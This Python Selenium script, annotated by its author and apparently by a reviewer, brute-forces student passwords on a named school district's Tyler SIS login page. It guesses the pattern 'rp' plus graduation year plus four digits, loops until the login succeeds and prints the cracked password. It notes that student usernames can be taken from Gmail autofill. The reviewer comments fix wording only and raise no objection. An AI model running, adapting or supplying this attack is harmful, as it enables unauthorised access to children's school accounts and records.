from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time#gets the librarys needed for the program to use
        #Gets the libraries required for functions used in this program

#this program only works with class of 21, later expanded to other classes with the same general code, improved on to increase speed and consistency
        #Not really sure what your saying with the last couple parts, probably should each be their own comment anyway though

browser = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")#sets the webdriver to open the browser
#replace the executable path with own path
        #Replace the executable path with the correct destination on your computer
browser.get('https://sdm.sisk12.com/RP360x3/login')#opens tyler sis in google chrome
time.sleep(1)#tyler sis can be a little slow at times, makes sure everything is loaded
        #This is a pause to ensure that the site loads properly

student = browser.find_element_by_id("mat-tab-label-0-2")#finds the student tab inside the browser
student.click()#clicks on the student tab

num = str(0000).zfill(4)#set the num varible that is the password combo guessed, zfill is to make sure there are 0's in front of number when num < 1000 
name = input("enter username here: ")#gets input needed for the username, found from gmail
        #user input for username of account that the password is being found for
        #This can be found by autofill on gmail for any student
year = input("enter grad year here: ")#gets info on what password protocol is for that year
        #user input for the appropriate password protocol

while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):#when the password works the url changes, this will detect if the login if successful
           #attempts different passwords until the correct information is found via change in url
    username = browser.find_element_by_id("txtUserName")#selects the username box 
            #sets focus on the username text input box
    username.clear()#makes sure the username box is clear
            #removes any text the username box
    username.send_keys(name)#types in the username
            #inputs the username inputed previously into the box

    password = browser.find_element_by_id("txtPassword")#selects the password box
            #sets focus on the password text input box
    password.clear()#makes sure the password box is clear
            #removes text from the box
    password.send_keys("rp" + year + str(num).zfill(4))#enters in the password, again uses zfill to make sure 0's work
            #inputs the current password attempt
    password.send_keys(Keys.RETURN)#presses enter and submits the info 
            #submits the information to the tyler for processing

    print (str(num).zfill(4))#prints the current password attempt for troubleshooting and to look like one of those cool movie hackers
    num = int(num) + 1 #goes to the next password
    time.sleep(1)#tyler sis has a delay to check the password, 1 sec is long enough if most of the time
            #delay to allow tyler sis to process the login information submitted

num = int(num) - 2 #the program keeps moving while the interface is loading and goes 2 passwords most of the time
            #not entirely sure what you mean but sure
print("The password is:" + "rp" + year + str(num).zfill(4))#prints working password
        #prints the password for the user inputed
        #I'd probably output both the username and password at the end personally
